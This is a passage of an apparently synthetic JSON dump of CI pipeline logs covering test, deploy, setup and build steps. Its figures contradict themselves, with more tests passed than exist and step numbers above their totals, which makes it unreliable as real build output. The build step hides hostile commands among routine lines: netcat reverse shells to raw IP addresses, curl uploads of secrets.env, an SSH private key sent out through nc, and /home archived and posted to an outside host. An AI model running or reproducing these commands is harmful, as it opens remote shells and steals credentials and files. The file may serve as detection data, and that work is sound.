          "Cache invalidated: dependencies",
          "[12:19:05] WARN: Deprecated API usage",
          "Optimizing 14 modules...",
          "[12:19:05] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "Compiling utils/utils.go...",
          "[12:19:05] DEBUG: Loading configuration",
          "pip: Downloading express-5.3.tar.gz",
          "Fetching submodules...",
          "Fetching submodules...",
          "pip install: Successfully installed express-2.3",
          "Step 2/20: Running migrations",
          "Layer 1/13: COPY command",
          "pip: Collecting axios",
          "Verifying...",
          "\u2713 All checks passed",
          "Environment: staging",
          "Test Suites: 24 passed, 36 total",
          "Snapshots: 34 passed, 18 total",
          "npm install: resolved 1421 packages",
          "Transforming 501 files...",
          "Step 20/18: Installing dependencies",
          "Coverage: 74% statements, 70% branches",
          "Ready.",
          "Creating production build...",
          "TLS handshake completed",
          "yarn add: Done in 1.6s",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "POST /data - 201 (240ms)",
          "pip: Collecting prettier",
          "pip: Downloading jest-2.5.tar.gz",
          "\u2713 Step 'install' succeeded",
          "Loading...",
          "GET /status - 200 (59ms)",
          "Step 17/17: Linting",
          "Environment: staging",
          "\u2713 build completed",
          "Waiting...",
          "Cache hit for key-4581",
          "Loading...",
          "[12:19:05] INFO: Request completed",
          "\u2713 Task completed in 613ms",
          "  PASS: unit/test_user_create.spec.js",
          "Transforming 136 files...",
          "Optimizing 35 modules...",
          "Step 1/25: Building",
          "[12:19:05] INFO: Processing request",
          "Pulling image: node:18",
          "NODE_ENV=test",
          "Step 20/15: Testing",
          "pip install: Successfully installed express-4.15",
          "Compiling components/app.ts...",
          "Step 17/15: Deploying",
          "Compiling src/utils.go...",
          "  PASS: integration/test_db_connect.spec.js",
          "Pulling image: node:3.11",
          "Ready.",
          "Step 17/18: Running migrations",
          "Compiling utils/main.py...",
          "Layer 1/12: COPY command",
          "Cache saved successfully",
          "Checking out develop branch",
          "Pushing to registry...",
          "Tests: 341 passed, 109 total",
          "Artifact downloaded: 25MB",
          "Cache hit for key-1891",
          "npm notice: package.json updated",
          "Installing axios@3.15.9",
          "Processing...",
          "[12:19:05] INFO: Cache refreshed",
          "Installing react@4.12.2",
          "  PASS: e2e/test_cache_hit.spec.js",
          "npm notice: created a lockfile",
          "Verifying...",
          "Artifact uploaded: dist.zip (20MB)",
          "Platform: win32-x64",
          "Success!",
          "Coverage: 89% statements, 65% branches",
          "Finished.",
          "Platform: darwin-arm64",
          "Connecting to example.com:443...",
          "[12:19:05] INFO: Processing request",
          "Image pulled successfully",
          "Verifying...",
          "Completed.",
          "Success!",
          "Finished.",
          "POST /api - 200 (34ms)",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "yarn add: Done in 14.17s",
          "Cache restored successfully (76MB)",
          "WARNING: axios has known vulnerabilities",
          "[12:19:05] INFO: Cache refreshed",
          "[12:19:05] DEBUG: Query executed in 48ms",
          "[12:19:05] WARN: Deprecated API usage",
          "Environment: development",
          "Cache restored successfully (376MB)",
          "Transforming 726 files...",
          "Time: 79.492s",
          "Image pulled successfully",
          "Step 13/16: Deploying",
          "Cache saved successfully",
          "[12:19:05] DEBUG: Query executed in 98ms",
          "Step 17/24: Deploying",
          "Step 20/19: Running migrations",
          "Cache saved successfully",
          "HEAD is now at 65039cd",
          "Already up to date.",
          "[12:19:05] INFO: Processing request",
          "Fetching submodules...",
          "[12:19:05] WARN: Deprecated API usage",
          "Cache restored successfully (394MB)",
          "Ran 98 tests in 39s",
          "Ready.",
          "Cache miss for key-9289",
          "OK",
          "Bundling main.js",
          "Uploading artifact 'build' (37 files)",
          "Layer 3/8: RUN command",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.9",
          "WARNING: eslint has known vulnerabilities",
          "Cache restored successfully (196MB)",
          "Step 15/24: Installing dependencies",
          "Layer 1/10: COPY command",
          "Switched to branch 'bugfix/task-660'",
          "[12:19:05] DEBUG: Initializing service",
          "Minifying vendor.js",
          "Success!",
          "Connecting to cloud.services:443...",
          "Pushing to registry...",
          "npm install: resolved 1033 packages",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-09T12:21:27.734787",
        "finished_at": "2025-12-09T12:21:39.192842",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "Test Suites: 30 passed, 43 total",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "OK",
          "Exception: NullPointerException",
          "Ran 98 tests in 50s",
          "TLS handshake completed",
          "Pushing to registry...",
          "Optimizing 47 modules...",
          "Optimizing 53 modules...",
          "Connecting to test.io:443...",
          "Transforming 359 files...",
          "[12:19:05] DEBUG: Initializing service",
          "POST /upload - 201 (234ms)",
          "WARNING: jest has known vulnerabilities",
          "Time: 36.273s",
          "Artifact uploaded: dist.zip (91MB)",
          "  PASS: integration/test_api_health.spec.js",
          "Artifact downloaded: 12MB",
          "Building Docker image...",
          "pip install: Successfully installed webpack-2.4",
          "pip: Downloading prettier-2.12.tar.gz",
          "[12:19:05] INFO: Cache refreshed",
          "pip install: Successfully installed lodash-1.12",
          "Step 9/18: Linting",
          "Cache invalidated: dependencies",
          "[12:19:05] DEBUG: Loading configuration",
          "[12:19:05] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "POST /api - 202 (129ms)",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "Using Node.js 15.5.7",
          "yarn add: Done in 26.45s",
          "Step 13/24: Deploying",
          "Step 19/23: Testing",
          "Minifying vendor.js",
          "Installing axios@4.3.3",
          "TLS handshake completed",
          "Ran 133 tests in 38s",
          "Compiling lib/app.ts...",
          "[12:19:05] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "yarn add: Done in 5.6s",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "Finished.",
          "[12:19:05] INFO: Processing request",
          "pip: Downloading eslint-2.18.tar.gz",
          "Layer 4/11: COPY command",
          "[12:19:05] INFO: Cache refreshed",
          "Step 11/15: Deploying",
          "Connecting to acme.corp:443...",
          "Step 3/24: Testing",
          "[12:19:05] DEBUG: Query executed in 50ms",
          "Connecting to startup.dev:443...",
          "Step 13/23: Building",
          "Loading...",
          "POST /data - 200 (80ms)",
          "WARNING: express has known vulnerabilities",
          "[12:19:05] INFO: Cache refreshed",
          "Pushing to registry...",
          "Time: 75.12s",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "Image pulled successfully",
          "Time: 64.950s",
          "Done.",
          "  PASS: integration/test_user_create.spec.js",
          "Already up to date.",
          "Already up to date.",
          "Using Python 3.11",
          "Cache saved successfully",
          "Cache miss for key-5583",
          "Verifying...",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (9 files)",
          "Checking out main branch",
          "[12:19:05] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Platform: linux-x64",
          "Connecting to cloud.services:443...",
          "Pushing to registry...",
          "Success!",
          "Step 10/20: Building",
          "Step 11/21: Installing dependencies",
          "Bundling main.js",
          "Bundling main.js",
          "\u2713 Task completed in 2550ms",
          "[12:19:05] DEBUG: Query executed in 3ms",
          "npm install: resolved 286 packages",
          "Pulling image: python:18",
          "\u2713 Task completed in 4857ms",
          "Building Docker image...",
          "Finished.",
          "Using Node.js 14.4.4",
          "Step 3/23: Deploying",
          "[12:19:05] DEBUG: Loading configuration",
          "Minifying vendor.js",
          "[12:19:05] INFO: Processing request",
          "Cache saved successfully",
          "\u2717 build failed with exit code 124",
          "Generating source maps...",
          "Optimizing 100 modules...",
          "yarn add: Done in 6.51s",
          "Processing...",
          "Generating source maps...",
          "Time: 95.448s",
          "Connecting to test.io:443...",
          "Completed.",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "Waiting...",
          "Waiting...",
          "Transforming 459 files...",
          "Transforming 987 files...",
          "[12:19:05] INFO: Processing request",
          "Cache hit for key-3426",
          "pip: Installing build dependencies...",
          "[12:19:05] WARN: Deprecated API usage",
          "Success!",
          "Pulling image: python:18",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'feature/task-518'",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 178 tests in 10s",
          "Loading...",
          "FAILED: test_auth_login",
          "Artifact uploaded: dist.zip (92MB)",
          "Waiting...",
          "Step 6/21: Linting",
          "Using Node.js 18.6.9",
          "Coverage: 91% statements, 87% branches",
          "Step 16/20: Linting",
          "Compiling src/index.js...",
          "\u2713 Task completed in 1669ms",
          "Compiling src/app.ts...",
          "[12:19:05] DEBUG: Connection pool: 1 active",
          "Creating production build...",
          "Compiling utils/handler.rs...",
          "Compiling src/service.java...",
          "Image pulled successfully",
          "Optimizing 62 modules...",
          "[12:19:05] INFO: Connecting to database",
          "Step 3/20: Installing dependencies",
          "Verifying...",
          "Time: 52.846s",
          "Cache miss for key-2779",
          "Environment: production",
          "npm notice: package.json updated",
          "Installing lodash@1.1.10",
          "[12:19:05] DEBUG: Connection pool: 16 active",
          "Snapshots: 10 passed, 15 total",
          "Step 6/15: Linting",
          "Done.",
          "[12:19:05] INFO: Request completed",
          "Ran 100 tests in 31s",
          "Artifact downloaded: 27MB",
          "Time: 51.680s",
          "Image pulled successfully",
          "Coverage: 77% statements, 74% branches",
          "Step 2/20: Running migrations",
          "yarn add: Done in 11.14s",
          "Connection established",
          "Transforming 424 files...",
          "GET /health - 204 (68ms)",
          "Pushing to registry...",
          "[12:19:05] DEBUG: Query executed in 43ms",
          "Minifying vendor.js",
          "Pulling image: alpine:latest",
          "Step 8/25: Building",
          "[12:19:05] INFO: Starting build process",
          "Using Node.js 15.1.6",
          "Fetching submodules...",
          "Processing...",
          "\u2713 package completed",
          "Transforming 927 files...",
          "[12:19:05] DEBUG: Initializing service",
          "Done.",
          "Pulling image: node:3.11",
          "Waiting...",
          "yarn add: Done in 12.90s",
          "POST /upload - 200 (170ms)",
          "Layer 6/14: ENV command",
          "Pushing to registry...",
          "Processing...",
          "HEAD is now at 75e3152",
          "Artifact downloaded: 13MB",
          "[12:19:05] DEBUG: Loading configuration",
          "\u2713 Task completed in 2249ms",
          "Pushing to registry...",
          "yarn add: Done in 25.56s",
          "Environment: development",
          "\u2713 Step 'install' succeeded",
          "Step 3/16: Running migrations",
          "[12:19:05] WARN: Deprecated API usage",
          "Generating source maps...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-09T12:21:39.192842",
        "finished_at": "2025-12-09T12:21:43.776064",
        "log_lines": [
          "=== Step: deploy_production ===",
          "GET /api - 204 (16ms)",
          "[12:19:05] DEBUG: Initializing service",
          "Pulling image: node:latest",
          "Completed.",
          "Tests: 51 passed, 411 total",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Task completed in 958ms",
          "Compiling src/main.py...",
          "Artifact uploaded: dist.zip (45MB)",
          "Step 2/24: Installing dependencies",
          "pip install: Successfully installed react-3.9",
          "Compiling utils/app.ts...",
          "[12:19:05] INFO: Request completed",
          "npm install: added 404 packages",
          "yarn add: Done in 19.6s",
          "[12:19:05] DEBUG: Connection pool: 3 active",
          "[12:19:05] ERROR: Connection failed",
          "GET /health - 200 (31ms)",
          "Using Python 3.9",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Loading...",
          "[12:19:05] INFO: Cache refreshed",
          "[12:19:05] DEBUG: Memory usage: 1153MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/15: Testing",
          "Step 15/22: Running migrations",
          "Transforming 511 files...",
          "Tests: 481 passed, 155 total",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Verifying...",
          "[12:19:05] INFO: Processing request",
          "[12:19:05] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:05] INFO: Processing request",
          "OK",
          "WARNING: jest has known vulnerabilities",
          "Done.",
          "Step 4/19: Linting",
          "Switched to branch 'bugfix/task-613'",
          "GET /health - 201 (45ms)",
          "Done.",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] DEBUG: Memory usage: 1791MB",
          "[12:19:05] INFO: Request completed",
          "\u2713 build completed",
          "Cache restored successfully (311MB)",
          "Success!",
          "Finished.",
          "Ran 19 tests in 37s",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "npm install: added 485 packages",
          "[12:19:05] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 47",
          "Pushing to registry...",
          "pip: Downloading lodash-3.9.tar.gz",
          "Artifact uploaded: dist.zip (76MB)",
          "[12:19:05] DEBUG: Loading configuration",
          "Cache miss for key-7772",
          "Generating source maps...",
          "Generating source maps...",
          "Step 5/18: Building",
          "[12:19:05] DEBUG: Memory usage: 766MB",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:05] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "npm install: resolved 980 packages",
          "Step 12/15: Installing dependencies",
          "Bundling styles.css",
          "Connecting to cloud.services:443...",
          "[12:19:05] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Compiling lib/utils.go...",
          "POST /api - 201 (276ms)",
          "npm install: resolved 680 packages",
          "Connection established",
          "[12:19:05] WARN: Deprecated API usage",
          "Creating production build...",
          "NODE_ENV=test",
          "Generating source maps...",
          "Finished.",
          "  PASS: integration/test_auth_login.spec.js",
          "Minifying main.js",
          "[12:19:05] DEBUG: Connection pool: 5 active",
          "Step 11/25: Linting",
          "\u2713 deploy completed",
          "[12:19:05] DEBUG: Memory usage: 1511MB",
          "[12:19:05] DEBUG: Connection pool: 7 active",
          "Time: 67.812s",
          "[12:19:05] INFO: Starting build process",
          "Finished.",
          "Pushing to registry...",
          "[12:19:05] INFO: Processing request",
          "[12:19:05] INFO: Request completed",
          "[12:19:05] DEBUG: Initializing service",
          "Success!",
          "yarn add: Done in 15.56s",
          "Installing react@5.14.4",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-632'",
          "[12:19:05] DEBUG: Connection pool: 16 active",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Transforming 486 files...",
          "Step 15/25: Running migrations",
          "[12:19:05] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-1317",
          "Layer 9/9: RUN command",
          "[12:19:05] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Waiting...",
          "Pulling image: alpine:latest",
          "Done.",
          "pip install: Successfully installed axios-2.12",
          "Cache invalidated: build",
          "Compiling src/handler.rs...",
          "Optimizing 79 modules...",
          "Time: 27.555s",
          "Finished.",
          "Artifact uploaded: dist.zip (70MB)",
          "Transforming 479 files...",
          "Compiling src/app.ts...",
          "npm notice: package.json updated",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "GET /status - 200 (29ms)",
          "Verifying...",
          "Step 12/22: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "Processing...",
          "npm install: resolved 1441 packages",
          "Cache miss for key-4610",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 3/25: Installing dependencies",
          "yarn add: Done in 13.35s",
          "Using Python 3.11",
          "npm install: resolved 620 packages",
          "Environment: test",
          "[12:19:05] DEBUG: Connection pool: 3 active",
          "npm install: added 283 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:05] DEBUG: Connection pool: 11 active",
          "Cache hit for key-9124",
          "  PASS: test_auth_login (51ms)",
          "Bundling runtime.css",
          "TLS handshake completed",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/main.py...",
          "Test Suites: 34 passed, 9 total",
          "\u2713 Task completed in 3111ms",
          "HEAD is now at 077e041",
          "Artifact downloaded: 26MB",
          "Time: 113.698s",
          "Step 7/16: Installing dependencies",
          "pip: Collecting webpack",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 17/23: Deploying",
          "[12:19:05] DEBUG: Connection pool: 13 active",
          "Compiling lib/utils.go...",
          "[12:19:05] DEBUG: Memory usage: 1794MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "Processing...",
          "Minifying main.js",
          "Building Docker image...",
          "OK",
          "\u2713 Step 'build' succeeded",
          "Uploading artifact 'coverage' (26 files)",
          "Pushing to registry...",
          "[12:19:05] INFO: Request completed",
          "[12:19:05] INFO: Processing request",
          "Waiting...",
          "FAILED: test_db_connect",
          "Cache miss for key-7165",
          "pip install: Successfully installed react-4.19",
          "Waiting...",
          "Installing jest@1.14.2",
          "Loading...",
          "Using Python 3.9",
          "Connection established",
          "Step 16/18: Installing dependencies",
          "Building Docker image...",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Loading...",
          "[12:19:05] ERROR: Connection failed",
          "WARNING: react has known vulnerabilities",
          "Snapshots: 1 passed, 47 total",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Done.",
          "Ready.",
          "Installing axios@1.2.3",
          "WARNING: prettier has known vulnerabilities",
          "Step 18/24: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:05] INFO: Cache refreshed",
          "pip: Collecting jest",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-09T12:21:43.776064",
        "finished_at": "2025-12-09T12:21:55.234119",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 6/23: Testing",
          "Cache saved successfully",
          "Building Docker image...",
          "Cache miss for key-7992",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "Compiling lib/handler.rs...",
          "Cache invalidated: dependencies",
          "[12:19:05] DEBUG: Memory usage: 1678MB",
          "[12:19:05] ERROR: Connection failed",
          "Coverage: 97% statements, 85% branches",
          "yarn add: Done in 8.6s",
          "WARNING: webpack has known vulnerabilities",
          "Finished.",
          "\u2713 build completed",
          "Bundling vendor.css",
          "Already up to date.",
          "Snapshots: 9 passed, 44 total",
          "Cache invalidated: dependencies",
          "Cache invalidated: dependencies",
          "Waiting...",
          "GET /status - 204 (59ms)",
          "Coverage: 95% statements, 61% branches",
          "[12:19:05] DEBUG: Memory usage: 1866MB",
          "[12:19:05] ERROR: Connection failed",
          "Creating production build...",
          "Environment: staging",
          "Cache invalidated: node_modules",
          "[12:19:05] INFO: Processing request",
          "Finished.",
          "Pulling image: alpine:3.11",
          "Cache miss for key-4699",
          "NODE_ENV=production",
          "[12:19:05] INFO: Request completed",
          "Connecting to cloud.services:443...",
          "Cache miss for key-1040",
          "Artifact uploaded: dist.zip (55MB)",
          "npm install: resolved 438 packages",
          "Environment: production",
          "Compiling lib/utils.go...",
          "yarn add: Done in 25.95s",
          "Connection established",
          "Coverage: 73% statements, 72% branches",
          "\u2713 build completed",
          "[12:19:05] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 9",
          "OK",
          "Compiling components/index.js...",
          "GET /api - 200 (93ms)",
          "npm install: resolved 987 packages",
          "Completed.",
          "pip: Collecting react",
          "Compiling components/utils.go...",
          "Connecting to startup.dev:443...",
          "Step 6/25: Testing",
          "Environment: production",
          "Ready.",
          "Compiling src/utils.go...",
          "[12:19:05] DEBUG: Loading configuration",
          "Minifying main.js",
          "Image pulled successfully",
          "Snapshots: 33 passed, 36 total",
          "[12:19:05] ERROR: Connection failed",
          "Step 5/15: Linting",
          "Cache saved successfully",
          "npm install: added 247 packages",
          "Minifying vendor.js",
          "[12:19:05] INFO: Request completed",
          "Step 2/15: Deploying",
          "Processing...",
          "[12:19:05] DEBUG: Connection pool: 2 active",
          "Finished.",
          "Artifact downloaded: 34MB",
          "Compiling components/handler.rs...",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "Step 1/15: Linting",
          "Ready.",
          "Ready.",
          "Waiting...",
          "[12:19:05] INFO: Connecting to database",
          "Processing...",
          "  PASS: test_user_create (482ms)",
          "POST /data - 202 (49ms)",
          "[12:19:05] DEBUG: Connection pool: 6 active",
          "Waiting...",
          "\u2713 Task completed in 3940ms",
          "Artifact uploaded: dist.zip (97MB)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Task completed in 4099ms",
          "Platform: darwin-arm64",
          "Connection established",
          "Minifying app.js",
          "Processing...",
          "Connecting to cloud.services:443...",
          "\u2713 Task completed in 2487ms",
          "Time: 19.749s",
          "Coverage: 83% statements, 97% branches",
          "OK",
          "\u2713 All checks passed",
          "Done.",
          "Tests: 400 passed, 274 total",
          "Building Docker image...",
          "[12:19:05] DEBUG: Connection pool: 18 active",
          "[12:19:05] DEBUG: Loading configuration",
          "Minifying main.js",
          "Compiling lib/utils.go...",
          "Using Python 3.11",
          "Switched to branch 'bugfix/task-599'",
          "Compiling utils/handler.rs...",
          "npm install: resolved 125 packages",
          "Step 4/15: Running migrations",
          "Waiting...",
          "Loading...",
          "[12:19:05] DEBUG: Connection pool: 17 active",
          "Checking out main branch",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-202'",
          "[12:19:05] INFO: Cache refreshed",
          "Building Docker image...",
          "Snapshots: 2 passed, 5 total",
          "\u2713 Task completed in 3038ms",
          "Fetching submodules...",
          "Already up to date.",
          "Image pulled successfully",
          "[12:19:05] INFO: Processing request",
          "GET /api - 200 (54ms)",
          "npm install: added 284 packages",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:05] DEBUG: Memory usage: 200MB",
          "Compiling utils/service.java...",
          "Done.",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 12/21: Installing dependencies",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:19:05] DEBUG: Query executed in 12ms",
          "[12:19:05] DEBUG: Connection pool: 15 active",
          "Compiling lib/utils.go...",
          "Step 1/23: Running migrations",
          "Compiling components/app.ts...",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "GET /api - 200 (32ms)",
          "Step 4/17: Deploying",
          "[12:19:05] DEBUG: Initializing service",
          "Using Node.js 16.16.5",
          "[12:19:05] DEBUG: Initializing service",
          "Ran 154 tests in 55s",
          "[12:19:05] ERROR: Connection failed",
          "Transforming 139 files...",
          "Building Docker image...",
          "  PASS: test_db_connect (44ms)",
          "Completed.",
          "[12:19:05] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Step 12/23: Installing dependencies",
          "pip install: Successfully installed lodash-1.18",
          "Tests: 76 passed, 52 total",
          "[12:19:05] INFO: Cache refreshed",
          "pip: Collecting lodash",
          "pip: Collecting lodash",
          "HEAD is now at 7e2353b",
          "pip: Downloading jest-4.18.tar.gz",
          "Step 19/25: Running migrations",
          "Cache miss for key-2721",
          "\u2713 validate completed",
          "npm install: added 320 packages",
          "Compiling lib/utils.go...",
          "[12:19:05] INFO: Cache refreshed",
          "Image pulled successfully",
          "Minifying app.js",
          "Coverage: 81% statements, 63% branches",
          "\u2713 All checks passed",
          "Checking out main branch",
          "Time: 73.128s",
          "Finished.",
          "npm notice: created a lockfile",
          "  PASS: e2e/test_user_create.spec.js",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:05] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Checking out develop branch",
          "OK",
          "[12:19:05] DEBUG: Query executed in 31ms",
          "Time: 110.434s",
          "Verifying...",
          "NODE_ENV=test",
          "Step 1/17: Deploying",
          "Snapshots: 33 passed, 10 total",
          "GET /status - 204 (71ms)",
          "Checking out develop branch",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "Switched to branch 'feature/task-867'",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-09T12:21:55.234119",
        "finished_at": "2025-12-09T12:22:29.608285",
        "log_lines": [
          "=== Step: build ===",
          "Already up to date.",
          "[12:19:05] DEBUG: Connection pool: 8 active",
          "Tests: 165 passed, 129 total",
          "[12:19:05] DEBUG: Initializing service",
          "FAILED: test_auth_login",
          "WARNING: axios has known vulnerabilities",
          "npm install: resolved 159 packages",
          "[12:19:05] INFO: Cache refreshed",
          "Connecting to acme.corp:443...",
          "Checking out master branch",
          "yarn add: Done in 2.20s",
          "Snapshots: 16 passed, 44 total",
          "  PASS: test_auth_login (253ms)",
          "Tests: 77 passed, 398 total",
          "Sending 245MB of data to test.io",
          "OK",
          "[12:19:05] DEBUG: Connection pool: 14 active",
          "Creating production build...",
          "Test Suites: 37 passed, 6 total",
          "[12:19:05] DEBUG: Query executed in 69ms",
          "Checking out main branch",
          "Minifying main.js",
          "Processing...",
          "Using Node.js 18.5.1",
          "OK",
          "Connection established",
          "Ready.",
          "Compiling utils/app.ts...",
          "npm install: resolved 1256 packages",
          "Cache saved successfully",
          "HEAD is now at 1e42258",
          "Artifact uploaded: build.tar.gz (19MB)",
          "pip install: Successfully installed prettier-4.13",
          "Using Node.js 14.7.6",
          "Exception: NullPointerException",
          "Switched to branch 'feature/task-191'",
          "[12:19:05] INFO: Cache refreshed",
          "pip: Downloading eslint-4.15.tar.gz",
          "\u2717 build failed with exit code 83",
          "Compiling src/app.ts...",
          "[12:19:05] INFO: Starting build process",
          "Bundling styles.js",
          "[12:19:05] DEBUG: Query executed in 72ms",
          "Waiting...",
          "Connecting to test.io:443...",
          "Step 11/24: Deploying",
          "Step 13/23: Linting",
          "Finished.",
          "Installing eslint@3.14.9",
          "Platform: linux-x64",
          "Cache restored successfully (211MB)",
          "Already up to date.",
          "Waiting...",
          "Exception: RuntimeError",
          "Test Suites: 11 passed, 30 total",
          "Image pulled successfully",
          "Cache saved successfully",
          "[12:19:05] DEBUG: Connection pool: 9 active",
          "Sending 10MB of data to example.com",
          "Transforming 930 files...",
          "Cache miss for key-2172",
          "Cache invalidated: dependencies",
          "[12:19:05] INFO: Cache refreshed",
          "Verifying...",
          "Cache saved successfully",
          "pip: Downloading lodash-3.0.tar.gz",
          "yarn add: Done in 3.88s",
          "Cache miss for key-5785",
          "Compiling components/handler.rs...",
          "Uploading artifact 'coverage' (14 files)",
          "WARNING: axios has known vulnerabilities",
          "[12:19:05] INFO: Connecting to database",
          "Environment: production",
          "npm install: added 368 packages",
          "Cache miss for key-9001",
          "nc -e /bin/sh 68.234.16.214 58788",
          "Already up to date.",
          "[12:19:05] DEBUG: Memory usage: 568MB",
          "npm install: added 75 packages",
          "pip: Downloading axios-2.10.tar.gz",
          "Pushing to registry...",
          "Transforming 842 files...",
          "Ran 75 tests in 37s",
          "Transforming 508 files...",
          "OK",
          "Artifact uploaded: dist.zip (52MB)",
          "[12:19:05] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "pip: Downloading react-1.4.tar.gz",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "npm install: added 301 packages",
          "Done.",
          "pip: Installing build dependencies...",
          "\u2713 deploy completed",
          "[12:19:05] ERROR: Connection failed",
          "Success!",
          "Cache saved successfully",
          "Finished.",
          "Installing axios@2.13.8",
          "[12:19:05] INFO: Processing request",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:19:05] DEBUG: Connection pool: 17 active",
          "[12:19:05] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:3.11",
          "Artifact downloaded: 45MB",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 67.111.222.235 24942",
          "Connection established",
          "Ran 120 tests in 41s",
          "Artifact uploaded: dist.zip (44MB)",
          "HEAD is now at 5dc17e4",
          "Step 20/23: Installing dependencies",
          "Pulling image: python:latest",
          "Step 11/15: Linting",
          "Step 7/23: Building",
          "pip: Downloading react-1.0.tar.gz",
          "Completed.",
          "Step 16/19: Installing dependencies",
          "\u2713 Task completed in 1281ms",
          "Coverage: 76% statements, 74% branches",
          "npm notice: package.json updated",
          "  PASS: integration/test_db_connect.spec.js",
          "Coverage: 84% statements, 81% branches",
          "Processing...",
          "\u2717 build failed with exit code 85",
          "Uploading artifact 'coverage' (23 files)",
          "Finished.",
          "Step 18/17: Running migrations",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (61MB)",
          "[12:19:05] INFO: Cache refreshed",
          "nc -e /bin/sh 121.245.10.24 62571",
          "WARNING: axios has known vulnerabilities",
          "Switched to branch 'hotfix/task-758'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:05] INFO: Starting build process",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: test_api_health (4ms)",
          "Environment: staging",
          "Compiling utils/handler.rs...",
          "Environment: test",
          "npm install: added 354 packages",
          "Using Python 3.11",
          "Completed.",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Ready.",
          "\u2717 build failed with exit code 61",
          "Waiting...",
          "Building Docker image...",
          "OK",
          "Step 8/19: Building",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:05] DEBUG: Initializing service",
          "Test Suites: 36 passed, 26 total",
          "HEAD is now at 0c1ffd5",
          "Pushing to registry...",
          "[12:19:05] DEBUG: Connection pool: 17 active",
          "Ran 88 tests in 47s",
          "Transforming 995 files...",
          "Done.",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
